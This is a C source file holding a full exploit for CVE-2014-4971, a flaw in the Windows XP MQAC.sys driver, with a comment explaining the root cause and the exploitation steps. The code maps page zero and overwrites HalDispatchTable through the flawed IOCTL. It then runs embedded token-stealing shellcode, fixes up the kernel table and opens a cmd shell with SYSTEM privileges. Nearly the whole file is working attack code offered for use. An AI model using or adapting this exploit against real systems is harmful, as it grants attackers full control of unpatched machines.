//
// An exploit for CVE-2014-4971, written by dev_zzo. NT 5.1 ONLY.
// Partially based on the original PoC [0] released by KoreLogic.
//
// Unfortunately, the PoC did NOT work properly on vanilla WinXP.
// I decided to take this as a challenge and write a proper exploit.
//
// What is the root cause of the vulnerability?
//
// It is caused due to an error within MQAC.sys when handling IOCTL
// code 0x1965020F. When handling this one, the execution falls through
// into another IOCTL, code 0x19650807. This IOCTL is not accessible from
// userland, supposedly available to mqsvc only. Apparently, somebody
// forgot to put "break" somewhere. Note this exists only in MQAC
// shipped with NT 5.1 (the .sys file version 5.1.xxxx). With version 5.2
// and later (NT 5.2 / Server 2k3), this seems to be fixed.
//
// The problem with 0x19650807 is, it blindly trusts the passed arguments,
// which allows for write-zero-where condition. Note the written data is
// NOT arbitrary, as stated in [0], in the sense that one doesn't have
// free choice of what to write.
//
// Exploitation flow:
// + Map page zero.
// + Locate NTOS and HalDispatchTable address within it.
// + Locate HAL and HaliQuerySystemInformation within it.
// + Invoke the flawed 0x1965020F, pointing to HalDispatchTable.
//   This overwrites the version field and the HaliQuerySystemInformation.
// + Copy token thief code to page zero and invoke it via NtQueryIntervalProfile.
// + Fix and copy HalDispatchTable fixup code to page zero and invoke it.
// + Pop you a cmd shell with SYSTEM privileges.
//
// NOTES:
//
// * Successful exploitation requires Message Queueing to be installed.
//
// [0] https://www.korelogic.com/Resources/Advisories/KL-001-2014-003.txt
//

#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>
#include "mq.h"

// A single prototype for all of them. Screw type safety.
typedef NTSTATUS (__stdcall *NTAPIPROC)();

NTAPIPROC NtAllocateVirtualMemory;
NTAPIPROC NtDeviceIoControlFile;
NTAPIPROC NtQueryIntervalProfile;

static void GetNtdllProcs(void)
{
	HMODULE hNtdll;
	hNtdll = LoadLibraryA("ntdll");
	NtAllocateVirtualMemory = (NTAPIPROC)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	NtDeviceIoControlFile = (NTAPIPROC)GetProcAddress(hNtdll, "NtDeviceIoControlFile");
	NtQueryIntervalProfile = (NTAPIPROC)GetProcAddress(hNtdll, "NtQueryIntervalProfile");
	FreeLibrary(hNtdll);
}

// For reference only.
__declspec(naked) void TokenThiefWinXP32()
{
	__asm
	{
		PUSH 44;
		POP EDX;
		MOV EAX,DWORD PTR FS:[124];
		MOV EAX,DWORD PTR DS:[EAX+EDX];
		ADD EDX,EDX;
		PUSH EAX;
	PROCLOOP:
		MOV EAX,DWORD PTR DS:[EAX+EDX];
		SUB EAX,EDX;
		CMP DWORD PTR DS:[EAX+EDX-4],4;
		JNE SHORT PROCLOOP;
		POP ECX;
		PUSH DWORD PTR DS:[EAX+EDX+40];
		POP DWORD PTR DS:[ECX+EDX+40];
		RETN;
	}
}

static BOOL MapPageZero(void)
{
	SIZE_T ZeroPageSize = 0x1000;
	PVOID BaseAddress = (PVOID)1;
	NTSTATUS Status;

	printf("\n[.] Allocating page zero... ");
	Status = NtAllocateVirtualMemory((PVOID)-1, &BaseAddress, 0, &ZeroPageSize, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
	if (Status)
	{
		printf("FAILED!");
		printf("\n[-] Error code (NTSTATUS): %08X", Status);
		return FALSE;
	}
	printf("OK.");

	return TRUE;
}

static BOOL LocateHalDispatchTable(PVOID *pHalDispatchTable)
{
	DWORD Dummy;
	PVOID NtosBaseAddress;
	UCHAR NtosBaseName[512];
	HMODULE hNtos;
	PVOID HalDispatchTable;

	printf("\n[.] Finding the kernel base address... ");
	if (!EnumDeviceDrivers(&NtosBaseAddress, sizeof(PVOID), &Dummy))
	{
		printf("FAILED!");
		printf("\n[-] Last error code: %08X", GetLastError());
		return FALSE;
	}

	if (GetDeviceDriverBaseNameA(NtosBaseAddress, NtosBaseName, sizeof(NtosBaseName)) == 0)
	{
		printf("FAILED");
		printf("\n[-] Last error code: %08X", GetLastError());
		return FALSE;
	}

	printf("OK.");
	printf("\n[+] Kernel base: %p, name: %s", NtosBaseAddress, NtosBaseName);

	printf("\n[.] Finding the HalDispatchTable address... ");
	hNtos = LoadLibraryExA(NtosBaseName, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (hNtos == NULL)
	{
		printf("FAILED!");
		printf("\n[-] Last error code: %08X", GetLastError());
		return FALSE;
	}

	HalDispatchTable = GetProcAddress(hNtos, "HalDispatchTable");
	FreeLibrary(hNtos);
	if (HalDispatchTable == NULL)
	{
		printf("FAILED!");
		printf("\n[-] Last error code: %08X", GetLastError());
		return FALSE;
	}
	printf("OK.");

	HalDispatchTable = (PVOID)((UINT_PTR)NtosBaseAddress + (UINT_PTR)HalDispatchTable - (UINT_PTR)hNtos);
	printf("\n[+] HalDispatchTable at: %p", HalDispatchTable);

	*pHalDispatchTable = HalDispatchTable;

	return TRUE;
}

static BOOL LocateHaliQuerySystemInformation(PVOID *pHaliQuerySystemInformation)
{
	DWORD Dummy;
	PVOID DriverBaseAddresses[2];
	PVOID HalBaseAddress;
	HMODULE Hal;
	PBYTE HalInitSystem;
	PBYTE InsnBytes;
	PBYTE EndOfSearch;
	PVOID HaliQuerySystemInformation = NULL;

	printf("\n[.] Finding the HAL base address... ");
	if (!EnumDeviceDrivers(DriverBaseAddresses, sizeof(DriverBaseAddresses), &Dummy))
	{
		printf("FAILED!");
		printf("\n[-] Last error code: %08X\r\n", GetLastError());
		return FALSE;
	}
	HalBaseAddress = DriverBaseAddresses[1];
	printf("OK.");
	printf("\n[+] HAL base: %p", HalBaseAddress);

	printf("\n[.] Locating HaliQuerySystemInformation... ");
	Hal = LoadLibraryExA("hal", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!Hal)
	{
		printf("FAILED!");
		return FALSE;
	}

	InsnBytes = HalInitSystem = GetProcAddress(Hal, "HalInitSystem");
	if (!HalInitSystem)
	{
		printf("FAILED!");
		FreeLibrary(Hal);
		return FALSE;
	}

	// A1????????C74004????????
	EndOfSearch = HalInitSystem + 0x300;
	while (InsnBytes < EndOfSearch)
	{
		if (InsnBytes[0] == 0xA1 && InsnBytes[5] == 0xC7 && InsnBytes[6] == 0x40 && InsnBytes[7] == 0x04)
		{
			HaliQuerySystemInformation = (PVOID)*(PUINT_PTR)&InsnBytes[8];
			break;
		}
		++InsnBytes;
	}
	if (!HaliQuerySystemInformation)
	{
		printf("FAILED!");
		return FALSE;
	}
	printf("OK.");

	HaliQuerySystemInformation = (PVOID)((UINT_PTR)HalBaseAddress + (UINT_PTR)HaliQuerySystemInformation - (UINT_PTR)Hal);
	printf("\n[+] HaliQuerySystemInformation at: %p", HaliQuerySystemInformation);
	*pHaliQuerySystemInformation = HaliQuerySystemInformation;

	FreeLibrary(Hal);
	return TRUE;
}

static BOOL MQOwn(PVOID Where)
{
	MQQUEUEPROPS QueueProps;
	MQPROPVARIANT aQueuePropVar[2];
	QUEUEPROPID aQueuePropId[2];
	HRESULT aQueueStatus[2];
	WCHAR wszLabel[MQ_MAX_Q_LABEL_LEN] = L"Pwn Queue";
	DWORD FormatLength = 256;
	WCHAR FormatName[256];
	QUEUEHANDLE QueueHandle;
	HRESULT Result;
	NTSTATUS Status;
	DWORD IoStatusBlock[2] = {0, 0};

	printf("\n[.] Creating a queue... ");
	// Set queue properties.
	aQueuePropId[0] = PROPID_Q_PATHNAME;
	aQueuePropVar[0].vt = VT_LPWSTR;
	aQueuePropVar[0].pwszVal = L".\\PRIVATE$\\Pwnage";

	aQueuePropId[1] = PROPID_Q_LABEL;
	aQueuePropVar[1].vt = VT_LPWSTR;
	aQueuePropVar[1].pwszVal = wszLabel;

	// Initialize the MQQUEUEPROPS structure.
	QueueProps.cProp = 2;               // Number of properties
	QueueProps.aPropID = aQueuePropId;        // IDs of the queue properties
	QueueProps.aPropVar = aQueuePropVar;      // Values of the queue properties
	QueueProps.aStatus = aQueueStatus;        // Pointer to the return status

	Result = MQCreateQueue(NULL, &QueueProps, FormatName, &FormatLength);
	if (Result)
	{
		printf("FAILED!");
		printf("\n[-] Error code (HRESULT): %08X", Result);
		//wcscpy(FormatName, L"DIRECT=OS:user-f02cbd2f41\\PRIVATE$\\Lolzz");
		return FALSE;
	}
	printf("OK.");
	printf("\n[.] Format name: %S", FormatName);

	printf("\n[.] Opening the queue... ");
	Result = MQOpenQueue(FormatName, MQ_PEEK_ACCESS, MQ_DENY_NONE, &QueueHandle);
	if (Result)
	{
		printf("FAILED!");
		printf("\n[-] Error code (HRESULT): %08X", Result);
		return FALSE;
	}
	printf("OK.");

	printf("\n[.] Performing flawed IOCTL call (%p)... ", Where);
	Status = NtDeviceIoControlFile(
		(HANDLE)QueueHandle,
		NULL,
		NULL,
		NULL,
		IoStatusBlock,
		0x1965020F,
		0, 5,
		Where, 0);

	if (Status == 0xC000009A)
	{
		printf("OK.");
	}
	else
	{
		printf("FAILED!");
		printf("\n[-] Error code (NTSTATUS): %08X", Status);
	}

	printf("\n[.] Closing queue... ");
	Result = MQCloseQueue(QueueHandle);

	printf("\n[.] Deleting queue... ");
	Result = MQDeleteQueue(FormatName);
	if (Result)
	{
		printf("FAILED!");
		printf("\n[-] Error code (HRESULT): %08X", Result);
		return FALSE;
	}
	printf("OK.");

	return TRUE;
}

static void TriggerCodeExec(void)
{
	ULONG DummyLong;
	printf("\n[.] Calling code at page zero...");
	NtQueryIntervalProfile(2, &DummyLong);
}

int main(int argc, char *argv[])
{
	int rc = 0;
	PVOID HalDispatchTable;
	PVOID HaliQuerySystemInformation;
	PROCESS_INFORMATION ProcInfo = {0,};
	STARTUPINFO StartInfo = {0,};
	char TokenThief[] =
		"\x6A\x44\x5A\x64\xA1\x24\x01\x00\x00\x8B\x04\x02\x01\xD2\x50\x8B"
		"\x04\x02\x29\xD0\x83\x7C\x02\xFC\x04\x75\xF4\x59\xFF\x74\x02\x40"
		"\x8F\x44\x0A\x40\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xC3";
	char Fixer[] =
		"\xB8\x44\x44\x44\x44\xC7\x00\x03\x00\x00\x00\xC7\x40\x04\xAA\xAA\xAA\xAA\xC3";

	printf("\nCVE-2014-4971, MQAC.sys privilege escalation exploit by dev_zzo.\n");

	GetNtdllProcs();
	if (!MapPageZero())
	{
		rc = 1;
		goto kthxbai;
	}

	if (!LocateHalDispatchTable(&HalDispatchTable))
	{
		rc = 2;
		goto kthxbai;
	}

	if (!LocateHaliQuerySystemInformation(&HaliQuerySystemInformation))
	{
		rc = 3;
		goto kthxbai;
	}

	printf("\n[!] EXPLOITING NOW.");
	if (!MQOwn(HalDispatchTable))
	{
		rc = 4;
		goto kthxbai;
	}

	printf("\n[!] Running stage 1 payload (token theft).");
	memcpy((PVOID)0x00000000, TokenThief, sizeof(TokenThief));
	TriggerCodeExec();

	printf("\n[!] Running stage 2 payload (fixing HalDispatchTable).");
	*(PUINT_PTR)&Fixer[1] = HalDispatchTable;
	*(PUINT_PTR)&Fixer[14] = HaliQuerySystemInformation;
	memcpy((PVOID)0x00000000, Fixer, sizeof(Fixer));
	TriggerCodeExec();

	printf("\n[.] Popping SYSTEM shell.");
	StartInfo.cb = sizeof(StartInfo);
	CreateProcessA(
		NULL,
		"C:\\windows\\system32\\cmd.exe",
		NULL,
		NULL,
		TRUE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&StartInfo,
		&ProcInfo);

kthxbai:
	printf("\n[+] XOXO, dev_zzo.\n");
	return rc;
}
